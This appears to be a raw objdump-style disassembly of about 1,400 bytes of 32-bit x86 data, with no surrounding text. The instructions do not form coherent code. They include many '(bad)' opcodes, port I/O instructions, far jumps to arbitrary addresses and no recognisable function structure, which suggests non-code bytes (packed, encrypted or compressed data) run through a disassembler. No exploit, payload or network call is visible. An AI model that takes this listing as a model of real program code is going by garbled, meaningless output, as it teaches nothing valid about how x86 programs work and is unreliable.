  41a691:	xor    eax,0xe4229d1b
  41a696:	push   ecx
  41a697:	lock or DWORD PTR [edx-0x72ad4b71],esi
  41a69e:	mov    eax,ss
  41a6a0:	jns    0x41a679
  41a6a2:	mov    dh,0x7f
  41a6a4:	inc    ecx
  41a6a5:	push   ecx
  41a6a6:	and    al,BYTE PTR [esi+edx*1+0x28]
  41a6aa:	enter  0xe721,0xc
  41a6ae:	cmp    dl,BYTE PTR [eax]
  41a6b0:	(bad)  
  41a6b1:	retf   0xa5f8
  41a6b4:	or     BYTE PTR ds:0x29914454,dh
  41a6ba:	popa   
  41a6bb:	fdiv   QWORD PTR [edi]
  41a6bd:	stos   BYTE PTR es:[edi],al
  41a6be:	mov    ch,0x95
  41a6c0:	inc    eax
  41a6c1:	push   ecx
  41a6c2:	fsub   DWORD PTR [ecx+0x46]
  41a6c5:	enter  0xc8bf,0xd0
  41a6c9:	cmp    BYTE PTR [edi-0x8ba59f5],dh
  41a6cf:	or     eax,0x11a7e8cd
  41a6d4:	rcr    BYTE PTR [edi],1
  41a6d6:	dec    eax
  41a6d7:	into   
  41a6d8:	imul   BYTE PTR [esi+edx*1]
  41a6db:	std    
  41a6dc:	fistp  DWORD PTR [eax-0x21f5837e]
  41a6e2:	cmp    al,0xdf
  41a6e4:	jmp    0x41a754
  41a6e6:	in     eax,0x11
  41a6e8:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41a6ea:	mov    ds:0x92a485fe,eax
  41a6ef:	push   0x69
  41a6f1:	sbb    al,0x2
  41a6f3:	sub    eax,0xf9821781
  41a6f8:	cld    
  41a6f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6fa:	push   ds
  41a6fb:	gs xchg esi,eax
  41a6fd:	rcr    DWORD PTR ds:0xceecf7c4,1
  41a703:	or     bl,dl
  41a705:	or     ebx,DWORD PTR [eax]
  41a707:	ss cmp bh,ah
  41a70a:	mov    bh,bh
  41a70c:	jmp    0x208b:0xd1f27b71
  41a713:	scas   eax,DWORD PTR es:[edi]
  41a714:	jno    0x41a74e
  41a716:	in     al,0x91
  41a718:	ss daa 
  41a71a:	mov    ebx,0x35a90321
  41a71f:	cmp    ecx,DWORD PTR [ebp+0x65ebd34d]
  41a725:	or     al,0xa4
  41a727:	pushf  
  41a728:	inc    eax
  41a729:	xchg   ebx,eax
  41a72a:	outs   dx,BYTE PTR ds:[esi]
  41a72b:	adc    eax,0x587c4386
  41a730:	sub    eax,0x1e90e7f9
  41a735:	loope  0x41a731
  41a737:	mov    ds:0xad84d092,eax
  41a73c:	es ins BYTE PTR es:[edi],dx
  41a73e:	inc    edx
  41a73f:	pop    esi
  41a740:	loopne 0x41a6f1
  41a742:	out    dx,eax
  41a743:	scas   eax,DWORD PTR es:[edi]
  41a744:	repnz popa 
  41a746:	fbld   TBYTE PTR [eax]
  41a748:	jns    0x41a712
  41a74a:	inc    ebp
  41a74b:	sbb    BYTE PTR [esi-0xa],dh
  41a74e:	cmp    esi,DWORD PTR [esi+esi*1-0x5]
  41a752:	push   edx
  41a753:	jmp    0x41a6db
  41a755:	xchg   esi,eax
  41a756:	pop    edi
  41a757:	mov    dl,0xf6
  41a759:	shr    DWORD PTR [ebx+ebx*1-0x3aae6ea8],1
  41a760:	call   0xf0317fe8
  41a765:	pop    ebp
  41a766:	mov    al,0xed
  41a768:	dec    eax
  41a769:	imul   ecx
  41a76b:	and    ebp,0xe52e4116
  41a771:	mov    dh,0x88
  41a773:	xchg   DWORD PTR [edi],eax
  41a775:	fsubr  QWORD PTR ds:0x757fd83b
  41a77b:	je     0x41a734
  41a77d:	xchg   esp,eax
  41a77e:	scas   eax,DWORD PTR es:[edi]
  41a77f:	mov    bl,0x9d
  41a781:	imul   ebp,ebp,0x436d42e7
  41a787:	and    ecx,ecx
  41a789:	loop   0x41a7c6
  41a78b:	fisttp WORD PTR [edi-0x7c3d8ac]
  41a791:	xor    al,0xdb
  41a793:	popf   
  41a794:	jno    0x41a74d
  41a796:	call   0xdbb1bce0
  41a79b:	dec    edx
  41a79c:	sti    
  41a79d:	rcr    BYTE PTR [ebp-0x60],0x50
  41a7a1:	push   ds
  41a7a2:	cmp    al,0xc2
  41a7a4:	mov    dl,BYTE PTR [ecx-0x52]
  41a7a7:	mov    dh,0x0
  41a7a9:	popf   
  41a7aa:	and    ecx,edi
  41a7ac:	fist   DWORD PTR [ecx+0x61]
  41a7af:	das    
  41a7b0:	pop    ds
  41a7b1:	repz inc esp
  41a7b3:	inc    ebx
  41a7b4:	push   edi
  41a7b5:	icebp  
  41a7b6:	inc    ebx
  41a7b7:	xor    BYTE PTR [ebx-0x65],ah
  41a7ba:	fld    QWORD PTR [ecx]
  41a7bc:	ret    0x56f9
  41a7bf:	xchg   ebx,eax
  41a7c0:	aad    0x7b
  41a7c2:	lea    esp,[ebx]
  41a7c4:	mov    eax,0x51f9b9d8
  41a7c9:	bound  eax,QWORD PTR [ecx-0x18be9c0d]
  41a7cf:	test   BYTE PTR [ebx],0xa6
  41a7d2:	jae    0x41a843
  41a7d4:	mov    dh,0x45
  41a7d6:	dec    edx
  41a7d7:	sti    
  41a7d8:	fsubr  QWORD PTR [edi-0xc]
  41a7db:	pop    ecx
  41a7dc:	sub    ah,ah
  41a7de:	add    ch,BYTE PTR [esi-0x9]
  41a7e1:	pop    ecx
  41a7e2:	sbb    al,0x32
  41a7e4:	and    eax,0x891f8d0b
  41a7e9:	or     eax,0xff2e51e1
  41a7ee:	pop    DWORD PTR [ebx+0x7e3c17b6]
  41a7f4:	test   eax,0x6e029797
  41a7f9:	push   edi
  41a7fa:	or     ah,BYTE PTR [ebp-0x45]
  41a7fd:	sbb    bh,BYTE PTR [edi]
  41a7ff:	sahf   
  41a800:	jp     0x41a86f
  41a802:	and    ebx,edx
  41a804:	stos   DWORD PTR es:[edi],eax
  41a805:	sahf   
  41a806:	lock sbb BYTE PTR [ecx-0x58],bl
  41a80a:	xchg   ecx,eax
  41a80b:	jo     0x41a7da
  41a80d:	pop    ebp
  41a80e:	xchg   BYTE PTR [esi+ebx*4-0x5a],cl
  41a812:	cwde   
  41a813:	jne    0x41a7cd
  41a815:	loop   0x41a7d4
  41a817:	jmp    0x41a895
  41a819:	xchg   esi,eax
  41a81a:	retf   0x86b5
  41a81d:	mov    ah,0xb3
  41a81f:	cwde   
  41a820:	jno    0x41a87f
  41a822:	jb     0x41a835
  41a824:	mov    ebp,0x633f57e2
  41a829:	mov    esp,cs
  41a82b:	sbb    eax,0x2eb148c
  41a830:	mov    ebx,0x1b1bfcc2
  41a835:	sub    ebx,DWORD PTR [eax]
  41a837:	test   DWORD PTR [edi+0x78d01104],edi
  41a83d:	cld    
  41a83e:	dec    edx
  41a83f:	in     eax,0xac
  41a841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a842:	aaa    
  41a843:	das    
  41a844:	popa   
  41a845:	xor    eax,0x673bbfe1
  41a84a:	sub    DWORD PTR [esi-0x6e46b0fc],esi
  41a850:	retf   
  41a851:	ins    DWORD PTR es:[edi],dx
  41a852:	mov    ecx,0x8e3d8d25
  41a857:	mov    edi,0xfe2d7029
  41a85c:	xor    cl,ah
  41a85e:	fwait
  41a85f:	xchg   ecx,esp
  41a861:	into   
  41a862:	sub    esi,DWORD PTR [ecx-0xe]
  41a865:	cmp    cl,dl
  41a867:	xchg   DWORD PTR [edx],edi
  41a869:	ror    DWORD PTR [esi+0x3cbe28cb],cl
  41a86f:	cld    
  41a870:	in     al,0x3b
  41a872:	push   esi
  41a873:	fwait
  41a874:	pop    esp
  41a875:	mov    edi,0x3dc909bc
  41a87a:	out    dx,eax
  41a87b:	jo     0x41a7fd
  41a87d:	bnd call 0x96c41a33
  41a883:	sahf   
  41a884:	xor    edi,esi
  41a886:	nop
  41a887:	retf   
  41a888:	mov    dh,0xd3
  41a88a:	push   esp
  41a88b:	push   eax
  41a88c:	mov    cl,0x94
  41a88e:	inc    esi
  41a88f:	cmp    ch,BYTE PTR [esi-0x1333f0d3]
  41a895:	jg     0x41a909
  41a897:	sub    eax,0x99f0ab30
  41a89c:	das    
  41a89d:	sbb    al,bl
  41a89f:	or     eax,0xe04f6e3f
  41a8a4:	lea    eax,[eax-0x17572f29]
  41a8aa:	bound  eax,QWORD PTR [eax]
  41a8ac:	cwde   
  41a8ad:	jns    0x41a91f
  41a8af:	inc    esp
  41a8b0:	sub    edi,DWORD PTR [ecx+0x24d774dc]
  41a8b6:	xchg   ebp,eax
  41a8b7:	ins    DWORD PTR es:[edi],dx
  41a8b8:	cli    
  41a8b9:	cmp    DWORD PTR [si-0x58],0x43
  41a8be:	xchg   edi,eax
  41a8bf:	or     DWORD PTR [esi],0x37
  41a8c2:	bnd jmp 0x41a8d0
  41a8c5:	aas    
  41a8c6:	and    BYTE PTR ds:0x19888bab,ah
  41a8cc:	sbb    edx,esp
  41a8ce:	mov    ah,0x7a
  41a8d0:	loop   0x41a8f7
  41a8d2:	sub    al,0x79
  41a8d4:	fst    DWORD PTR [edi+eax*2]
  41a8d7:	stos   DWORD PTR es:[edi],eax
  41a8d8:	jg     0x41a889
  41a8da:	ficom  WORD PTR [edi-0x69]
  41a8dd:	sbb    eax,0x899f4eae
  41a8e2:	shl    BYTE PTR [edx+ecx*4-0x1f],0xb3
  41a8e7:	cld    
  41a8e8:	sahf   
  41a8e9:	shl    BYTE PTR [edx+0x7de2a53d],1
  41a8ef:	scas   al,BYTE PTR es:[edi]
  41a8f0:	ins    DWORD PTR es:[edi],dx
  41a8f1:	xchg   edi,eax
  41a8f2:	add    ah,cl
  41a8f4:	fdiv   QWORD PTR [edx]
  41a8f6:	inc    edx
  41a8f7:	cmp    BYTE PTR [esi],ch
  41a8f9:	div    DWORD PTR [eax]
  41a8fb:	sbb    eax,DWORD PTR [eax-0x24]
  41a8fe:	sbb    DWORD PTR [ebx],0xffffffff
  41a901:	arpl   bp,dx
  41a903:	jecxz  0x41a971
  41a905:	pop    ss
  41a906:	ins    BYTE PTR es:[edi],dx
  41a907:	test   ebx,edi
  41a909:	sub    edi,DWORD PTR [esi-0x1c]
  41a90c:	(bad)  
  41a90d:	mov    dh,0x6e
  41a90f:	imul   edx,DWORD PTR [edi-0x5f],0x5a
  41a913:	dec    edi
  41a914:	not    DWORD PTR gs:[eax]
  41a917:	js     0x41a94a
  41a919:	xchg   ebx,eax
  41a91a:	dec    ebp
  41a91b:	and    al,0x36
  41a91d:	dec    edi
  41a91e:	pop    esp
  41a91f:	add    dh,ah
  41a921:	into   
  41a922:	pop    edx
  41a923:	jecxz  0x41a8ef
  41a925:	sti    
  41a926:	repnz inc esp
  41a928:	add    eax,0x1d514cf8
  41a92d:	jns    0x41a969
  41a92f:	or     al,0xe
  41a931:	mov    ebx,0xbf17774
  41a936:	lock mov bl,0xb7
  41a939:	cmp    eax,0xe2df1969
  41a93e:	shr    DWORD PTR [eax-0x71],0x52
  41a942:	dec    DWORD PTR [ecx]
  41a944:	sahf   
  41a945:	retf   
  41a946:	cdq    
  41a947:	out    0x38,eax
  41a949:	aad    0x74
  41a94b:	mov    eax,ss:0x1ec9d0bc
  41a951:	dec    ebx
  41a952:	call   0xcd91:0x3589c982
  41a959:	mov    BYTE PTR [edx-0xcb83c76],dl
  41a95f:	rcr    DWORD PTR ds:0x6e78d89d,cl
  41a965:	lods   eax,DWORD PTR ds:[esi]
  41a966:	jo     0x41a8fc
  41a968:	push   edx
  41a969:	cmp    BYTE PTR [esi+0x11],dl
  41a96c:	pop    es
  41a96d:	pop    ecx
  41a96e:	jo     0x41a9bb
  41a970:	mov    edx,0x72fe58ad
  41a975:	mov    ebp,0x34b2e06f
  41a97a:	xor    BYTE PTR [ebp+ecx*2-0x18],ch
  41a97e:	adc    eax,0xd4d25eb9
  41a983:	int    0xce
  41a985:	lods   al,BYTE PTR ds:[esi]
  41a986:	pop    esp
  41a987:	add    BYTE PTR [ebx+edi*1-0x4ae6fd4d],dh
  41a98e:	mov    BYTE PTR [ecx],bh
  41a990:	xchg   edx,eax
  41a991:	cmp    esp,DWORD PTR [esi-0x42]
  41a994:	retf   0x9143
  41a997:	xor    esp,DWORD PTR [esi+0x43]
  41a99a:	ins    DWORD PTR es:[edi],dx
  41a99b:	mov    dh,0xc8
  41a99d:	dec    eax
  41a99e:	(bad)  
  41a99f:	mov    esi,0xaccccd61
  41a9a4:	push   ds
  41a9a5:	daa    
  41a9a6:	cmp    eax,0x4294052c
  41a9ab:	loop   0x41a96d
  41a9ad:	adc    ah,bl
  41a9af:	je     0x41a9ee
  41a9b1:	mov    cl,0xde
  41a9b3:	frstor [ebp-0x5fd8034]
  41a9b9:	fsub   QWORD PTR [edx+0x3d]
  41a9bc:	stos   DWORD PTR es:[edi],eax
  41a9bd:	and    BYTE PTR [eax+0x6b],dh
  41a9c0:	sub    al,0x7d
  41a9c2:	pop    ebp
  41a9c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9c4:	fistp  DWORD PTR [ebx-0x52]
  41a9c7:	push   0x59
  41a9c9:	rol    dh,cl
  41a9cb:	pop    ecx
  41a9cc:	jno    0x41a9af
  41a9ce:	xor    BYTE PTR [esi+eax*8],cl
  41a9d1:	pop    esi
  41a9d2:	retf   0xd5ed
  41a9d5:	mov    ds:0x94605f96,eax
  41a9da:	push   ecx
  41a9db:	in     eax,dx
  41a9dc:	in     al,0xd3
  41a9de:	js     0x41a9a9
  41a9e0:	push   edx
  41a9e1:	mov    BYTE PTR [ebp+0x34],dl
  41a9e4:	jnp    0x41aa21
  41a9e6:	add    BYTE PTR [eax+ebp*2],ch
  41a9e9:	jns    0x41a96e
  41a9eb:	mov    esp,0x35cf54f4
  41a9f0:	ficom  DWORD PTR [ebx]
  41a9f2:	add    ah,dl
  41a9f4:	rcr    DWORD PTR es:[edi-0x4e2d3439],0x45
  41a9fc:	daa    
  41a9fd:	scas   al,BYTE PTR es:[edi]
  41a9fe:	cld    
  41a9ff:	icebp  
  41aa00:	das    
  41aa01:	stos   DWORD PTR es:[edi],eax
  41aa02:	bound  ebx,QWORD PTR [edx-0x76]
  41aa05:	xchg   esi,eax
  41aa06:	push   esp
  41aa07:	fisttp WORD PTR [esi+0x6fad7d57]
  41aa0d:	outs   dx,DWORD PTR ds:[esi]
  41aa0e:	std    
  41aa0f:	cld    
  41aa10:	adc    BYTE PTR [eax+0x3b9cb127],ch
  41aa16:	fldenv [edi+ebp*4]
  41aa19:	loop   0x41aa1e
  41aa1b:	pop    ebp
  41aa1c:	ins    BYTE PTR es:[edi],dx
  41aa1d:	mov    cl,0xe7
  41aa1f:	das    
  41aa20:	mov    eax,ds:0x7330a507
  41aa25:	jo     0x41aa76
  41aa27:	xchg   ebx,eax
  41aa28:	xor    ecx,ecx
  41aa2a:	arpl   WORD PTR ds:0x8d892017,di
  41aa30:	les    edi,FWORD PTR [ebp+0x73af6d82]
  41aa36:	adc    DWORD PTR [eax-0x39e5552b],ecx
  41aa3c:	test   al,0x2e
  41aa3e:	lahf   
  41aa3f:	cwde   
  41aa40:	fimul  DWORD PTR [ecx+esi*1-0x5ccca5f8]
  41aa47:	adc    ebx,DWORD PTR [ebp*2-0x178a96a6]
  41aa4e:	mov    ecx,0x7811ff5c
  41aa53:	lock xor al,0x6c
  41aa56:	or     eax,0x6d1ab371
  41aa5b:	inc    ebx
  41aa5c:	adc    al,0x58
  41aa5e:	mov    cl,0x91
  41aa60:	inc    esp
  41aa61:	jmp    0x41aadd
  41aa63:	inc    edi
  41aa64:	(bad)  
  41aa65:	adc    cl,BYTE PTR [ebp+0x50]
  41aa68:	xchg   esp,eax
  41aa69:	xchg   DWORD PTR [ebx+0x1dc14714],ecx
  41aa6f:	jmp    DWORD PTR [ecx]
  41aa71:	or     ch,ah
  41aa73:	js     0x41aa79
  41aa75:	outs   dx,DWORD PTR ds:[esi]
  41aa76:	push   ecx
  41aa77:	and    ebp,ebx
  41aa79:	mov    bh,0xce
  41aa7b:	loop   0x41aae5
  41aa7d:	or     DWORD PTR [ebx*2+0x503c37ad],0xffffffc1
  41aa85:	icebp  
  41aa86:	adc    BYTE PTR [edi+0x1d],0x84
  41aa8a:	dec    eax
  41aa8b:	cwde   
  41aa8c:	pop    ds
  41aa8d:	mov    dl,0x2b
  41aa8f:	xchg   ebp,eax
  41aa90:	push   eax
  41aa91:	addr16 shr bh,1
  41aa94:	pop    es
  41aa95:	(bad)  
  41aa96:	int3   
  41aa97:	xor    eax,0xcbdf6182
  41aa9c:	popf   
  41aa9d:	dec    ebx
  41aa9e:	dec    ebx
  41aa9f:	ins    BYTE PTR es:[edi],dx
  41aaa0:	enter  0x145f,0x38
  41aaa4:	or     DWORD PTR ds:0x40f5b527,0xcbf69571
  41aaae:	xchg   BYTE PTR ds:0x111848e1,ch
  41aab4:	push   es
  41aab5:	js     0x41aa3f
  41aab7:	ret    
  41aab8:	hlt    
  41aab9:	clc    
  41aaba:	jmp    0x95ed:0x6e496eff
  41aac1:	(bad)  
  41aac2:	xor    esp,DWORD PTR [ebp+0x46dd8bb7]
  41aac8:	push   es
  41aac9:	loope  0x41aa8c
  41aacb:	out    dx,eax
  41aacc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aacd:	(bad)  
  41aace:	xor    cl,ah
  41aad0:	out    0x75,al
  41aad2:	pop    es
  41aad3:	jl     0x41ab4b
  41aad5:	jmp    0x82b7d4b6
  41aada:	push   edi
  41aadb:	xlat   BYTE PTR ds:[ebx]
  41aadc:	push   esp
  41aadd:	pop    ds
  41aade:	loopne 0x41aa9c
  41aae0:	cmp    DWORD PTR [esi],eax
  41aae2:	dec    esi
  41aae3:	dec    edi
  41aae4:	xor    al,0xc4
  41aae6:	mov    dh,0x41
  41aae8:	jp     0x41ab2f
  41aaea:	mov    ah,0xa1
  41aaec:	inc    ebx
  41aaed:	inc    ecx
  41aaee:	addr16 out dx,eax
  41aaf0:	xor    al,0x12
  41aaf2:	(bad)  
  41aaf3:	mov    dl,0x3f
  41aaf5:	js     0x41ab3d
  41aaf7:	jno    0x41ab4c
  41aaf9:	mov    al,ds:0xff794b97
  41aafe:	fcmovnu st,st(2)
  41ab00:	mov    esp,0xfc1ac74e
  41ab05:	jmp    0x1a1a43f5
  41ab0a:	(bad)  
  41ab0b:	mov    al,0x11
  41ab0d:	je     0x41aadb
  41ab0f:	mov    ch,0x10
  41ab11:	int3   
  41ab12:	imul   ecx,eax,0xffffff8e
  41ab15:	imul   esi,DWORD PTR [ecx-0x4d],0x5cacc3ea
  41ab1c:	inc    esi
  41ab1d:	cmc    
  41ab1e:	push   edx
  41ab1f:	in     al,0xeb
  41ab21:	lods   al,BYTE PTR ds:[esi]
  41ab22:	mov    edi,0xa013dc13
  41ab27:	pop    eax
  41ab28:	stos   BYTE PTR es:[edi],al
  41ab29:	and    BYTE PTR [ebp+0x534c60d4],0xb5
  41ab30:	xchg   esp,eax
  41ab31:	mov    bh,0x98
  41ab33:	frstor [ebx]
  41ab35:	lahf   
  41ab36:	inc    edx
  41ab37:	imul   edx,DWORD PTR [ebp-0x2db6a515],0x2fe67646
  41ab41:	(bad)  
  41ab42:	int3   
  41ab43:	fdivr  DWORD PTR [esi-0x62]
  41ab46:	mov    ebx,0x237ce983
  41ab4b:	jne    0x41ab0f
  41ab4d:	sbb    eax,0xf91a7247
  41ab52:	(bad)  
  41ab53:	sar    DWORD PTR [eax+0x3ef7123e],1
  41ab59:	cmp    dh,BYTE PTR [esi]
  41ab5b:	retf   
  41ab5c:	mov    ds:0xd3e596d6,eax
  41ab61:	or     ecx,DWORD PTR [ebx+edi*8+0x37]
  41ab65:	addr16 call 0x5b42:0xa5f1aaca
  41ab6d:	lods   al,BYTE PTR ds:[esi]
  41ab6e:	test   eax,0x59267ec4
  41ab73:	repnz pop ss
  41ab75:	sbb    DWORD PTR [eax+0x6e2b63bf],ebx
  41ab7b:	mov    bl,0xac
  41ab7d:	jbe    0x41ab17
  41ab7f:	into   
  41ab80:	mov    ebx,0xb35a9386
  41ab85:	and    BYTE PTR [ecx+0x76940d9c],al
  41ab8b:	jecxz  0x41ab4a
  41ab8d:	xchg   BYTE PTR [esi+0x7f3d91b0],dl
  41ab93:	or     bl,al
  41ab95:	aas    
  41ab96:	cli    
  41ab97:	arpl   WORD PTR [ebp+eax*1+0x68],si
  41ab9b:	pop    edi
  41ab9c:	add    bl,al
  41ab9e:	ds dec ecx
  41aba0:	out    0x13,eax
  41aba2:	repnz ror BYTE PTR [eax+esi*1-0x6eb46f72],1
  41abaa:	pop    ebx
  41abab:	mov    ecx,0xa2c7491f
  41abb0:	ror    BYTE PTR [esi+0x2d3275b3],0xab
  41abb7:	sbb    DWORD PTR [ebx],edi
  41abb9:	in     eax,dx
  41abba:	add    eax,0xedcc8094
  41abbf:	sub    DWORD PTR [eax+0x4b],0x892ac27c
  41abc6:	xchg   BYTE PTR [edx-0x79],bh
  41abc9:	mov    ecx,0x7d863ea6
  41abce:	(bad)  
  41abcf:	aaa    
  41abd0:	and    DWORD PTR [ecx+0x3db1f218],eax
  41abd6:	imul   edx,DWORD PTR [edx],0x298d5b9d
  41abdc:	data16 jo 0x41ab94
  41abdf:	adc    eax,edx
  41abe1:	or     eax,ebx
  41abe3:	xchg   ebx,eax
  41abe4:	add    ebx,DWORD PTR [ebx-0x68ed6bdd]
  41abea:	ss in  eax,0xd1
  41abed:	outs   dx,BYTE PTR ds:[esi]
  41abee:	scas   al,BYTE PTR es:[edi]
  41abef:	xchg   ebx,eax
  41abf0:	mov    ah,0x89
  41abf2:	(bad)
  41abf6:	idiv   BYTE PTR [ecx+0x1d89c689]
  41abfc:	lock pop ebx
  41abfe:	adc    cl,dh
  41ac00:	or     eax,0x9d0b0db3
  41ac05:	inc    esp
  41ac06:	jg     0x41abf1
  41ac08:	xchg   edi,eax
  41ac09:	xchg   edi,eax
  41ac0a:	add    BYTE PTR [edi-0x4555aaad],bh
  41ac10:	lds    eax,FWORD PTR [edx+0x65832c5e]
  41ac16:	mov    ds:0x9e318a0d,eax
  41ac1b:	push   esi
  41ac1c:	sub    al,0x58
  41ac1e:	inc    ecx
  41ac1f:	mov    ecx,0x31a85473
  41ac24:	cmc    
  41ac25:	dec    esi
  41ac26:	jle    0x41abef
  41ac28:	mov    dh,0x3
  41ac2a:	sti    
  41ac2b:	pop    ecx
  41ac2c:	int3   
  41ac2d:	mov    ebp,0x1bf615fd
  41ac32:	test   al,cl
  41ac34:	mov    edi,0x2b56e1c4
  41ac39:	retf   
  41ac3a:	outs   dx,BYTE PTR ds:[esi]
  41ac3b:	xor    edi,DWORD PTR [ebx-0x6670608f]
  41ac41:	cmp    eax,0x1a26027e
  41ac46:	jo     0x41ac5d
  41ac48:	xchg   edi,eax
  41ac49:	scas   al,BYTE PTR es:[edi]
  41ac4a:	lock fwait
  41ac4c:	xor    edx,DWORD PTR fs:[di+0xa79]
  41ac52:	xor    edx,ebx
  41ac54:	aaa    
  41ac55:	xchg   esi,eax
  41ac56:	pop    ebx
  41ac57:	mov    edx,0xb61de28
  41ac5c:	cmp    eax,0x5327cca7
  41ac61:	inc    DWORD PTR [esi+0x59]
  41ac64:	or     edi,esi
  41ac66:	sub    edi,DWORD PTR [edi]
  41ac68:	or     eax,0xde4d580
  41ac6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac6f:	retf   0x5a42
  41ac72:	push   edx
  41ac73:	xchg   ebx,eax
  41ac74:	pop    esp
  41ac75:	in     al,0x1a
  41ac77:	aad    0x65
  41ac79:	in     al,dx
  41ac7a:	xchg   BYTE PTR [edi],dl
  41ac7c:	and    ah,0xba
  41ac7f:	fstp   QWORD PTR [ebx+0x4226eac8]
  41ac85:	imul   eax,DWORD PTR [edi+0x50d781af],0x5004b417
  41ac8f:	fimul  DWORD PTR [edx-0x65]
  41ac92:	adc    al,0x98
  41ac94:	popf   
  41ac95:	pop    esp
  41ac96:	pop    edx
  41ac97:	pop    ebp
  41ac98:	fdivp  st(0),st
  41ac9a:	pop    eax
  41ac9b:	jmp    0xb752e7b8
  41aca0:	add    esi,DWORD PTR [edi+0x5d61e162]
  41aca6:	push   ebp
  41aca7:	ss inc ecx
  41aca9:	ss jmp 0xbc0c:0x7025ac62
  41acb1:	(bad)  
  41acb2:	push   ds
  41acb3:	out    0x99,eax
  41acb5:	ret    0xe40e
  41acb8:	or     BYTE PTR [eax-0x4],al
  41acbb:	jp     0x41ac42
  41acbd:	pop    ss
  41acbe:	jle    0x41acfe
  41acc0:	sbb    DWORD PTR [edx],ebx
  41acc2:	repnz imul eax,edx,0xffffffca
  41acc6:	and    al,bl
  41acc8:	fs ret 0x3ef5
  41accc:	pop    ecx
  41accd:	sub    edi,DWORD PTR [ebx-0x4b684a0a]
  41acd3:	jg     0x41aca9
  41acd5:	pop    ebx
  41acd6:	mov    esi,DWORD PTR [edx+0x4578e937]
  41acdc:	lock mov dh,0x36
  41acdf:	sub    bl,dh
  41ace1:	push   ebx
  41ace2:	dec    ebp
  41ace3:	xchg   edx,eax
  41ace4:	mov    ebx,0x4aa7b36b
  41ace9:	add    eax,DWORD PTR [ebx]
  41aceb:	mov    edx,0xc3af0769
  41acf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acf1:	add    DWORD PTR [esi-0x60],esp
  41acf4:	sar    BYTE PTR [ecx+0x36],0x2b
  41acf8:	aas    
  41acf9:	mov    bh,0x3e
  41acfb:	or     BYTE PTR [eax-0x19],dl
  41acfe:	mov    BYTE PTR [eax],ah
  41ad00:	js     0x41ad74
  41ad02:	fdivp  st(7),st
  41ad04:	mov    bl,BYTE PTR [ecx+0x6b]
  41ad07:	fiadd  DWORD PTR [ecx]
  41ad09:	mov    ebp,0x828ebd72
  41ad0e:	pushf  
  41ad0f:	inc    ebp
  41ad10:	inc    ecx
  41ad11:	jmp    0x4863a34
  41ad16:	call   DWORD PTR [ebx]
  41ad18:	sub    BYTE PTR [edi-0x23],0xec
  41ad1c:	mov    ebx,0x442ed50d
  41ad21:	jecxz  0x41ad80
  41ad23:	and    DWORD PTR [edi],ebx
  41ad25:	jbe    0x41acc6
  41ad27:	cmp    al,0x45
  41ad29:	outs   dx,DWORD PTR ds:[esi]
  41ad2a:	sbb    ch,dl
  41ad2c:	inc    edx
  41ad2d:	xchg   ecx,eax
  41ad2e:	fisub  WORD PTR [edi]
  41ad30:	sub    DWORD PTR [ebx],0x8baa6693
  41ad36:	dec    ebp
  41ad37:	inc    esi
  41ad38:	int3   
  41ad39:	sbb    al,0x72
  41ad3b:	aas    
  41ad3c:	dec    ebp
  41ad3d:	pusha  
  41ad3e:	ffree  st(0)
  41ad40:	sub    eax,0xfe22b768
  41ad45:	or     al,BYTE PTR [esi+0x7e40eebe]
  41ad4b:	imul   edx,DWORD PTR ds:0xd61c00df,0xffffff82
  41ad52:	stc    
  41ad53:	les    ecx,FWORD PTR [edi-0x24]
  41ad56:	outs   dx,DWORD PTR ds:[esi]
  41ad57:	add    al,0x1d
  41ad59:	in     al,dx
  41ad5a:	ins    DWORD PTR es:[edi],dx
  41ad5b:	retf   
  41ad5c:	stos   BYTE PTR es:[edi],al
  41ad5d:	mov    dl,0x78
  41ad5f:	stos   BYTE PTR es:[edi],al
  41ad60:	fsubr  DWORD PTR [ebx+0x5b]
  41ad63:	push   ds
  41ad64:	mov    ebp,0xa0cf6f26
  41ad69:	mov    cl,0xed
  41ad6b:	(bad)  
  41ad6c:	sub    ebx,ebx
  41ad6e:	and    eax,0x410396c7
  41ad73:	pusha  
  41ad74:	and    BYTE PTR [esi+0x6a08949a],bl
  41ad7a:	mov    ds:0x4ab62bf2,eax
  41ad7f:	sti    
  41ad80:	pop    edi
  41ad81:	packuswb mm7,QWORD PTR [edi]
  41ad84:	mov    cl,BYTE PTR [edi+0x27]
  41ad87:	imul   ebx
  41ad89:	push   0x1b6028d4
  41ad8e:	nop
  41ad8f:	loop   0x41adcd
  41ad91:	aaa    
  41ad92:	inc    ecx
  41ad93:	inc    ebx
  41ad94:	stos   BYTE PTR es:[edi],al
  41ad95:	sbb    ebp,DWORD PTR [esi-0x27]
  41ad98:	and    al,0xaf
  41ad9a:	mov    dl,BYTE PTR [eax-0x188904f9]
  41ada0:	sar    BYTE PTR [ebx-0x1],0x53
  41ada4:	inc    esp
  41ada5:	retf   
  41ada6:	fdiv   DWORD PTR [eax-0x812f41]
  41adac:	sbb    DWORD PTR [esi-0x45de1155],0x40
  41adb3:	inc    ecx
  41adb4:	and    al,0x9b
  41adb6:	call   0x2522:0xeafa8fb7
  41adbd:	loope  0x41ad8b
  41adbf:	mov    ds:0x1a6df0c4,al
  41adc4:	jmp    0x7084:0xdb51f83d
  41adcb:	imul   ebp,DWORD PTR [ebp-0x469fa076],0xffffffcb
  41add2:	ret    
  41add3:	aam    0x10
  41add5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41add6:	pushf  
  41add7:	loope  0x41ad99
  41add9:	dec    edx
  41adda:	inc    edi
  41addb:	inc    edx
  41addc:	dec    eax
  41addd:	ja     0x41ae48
  41addf:	jg     0x41ae1f
  41ade1:	adc    eax,0xf9a32e41
  41ade6:	pop    ds
  41ade7:	jmp    0x5dbee76e
  41adec:	rcr    DWORD PTR [ecx+0x31ee0f69],1
  41adf2:	stos   DWORD PTR es:[edi],eax
  41adf3:	mov    bh,0x6d
  41adf5:	stc    
  41adf6:	imul   ecx,DWORD PTR [esi-0x43],0x36
  41adfa:	loop   0x41ae1c
  41adfc:	cmp    DWORD PTR [ebx+edx*1+0x31],eax
  41ae00:	push   cs
  41ae01:	cmc    
  41ae02:	dec    edi
  41ae03:	mov    ds:0x1d4571cf,eax
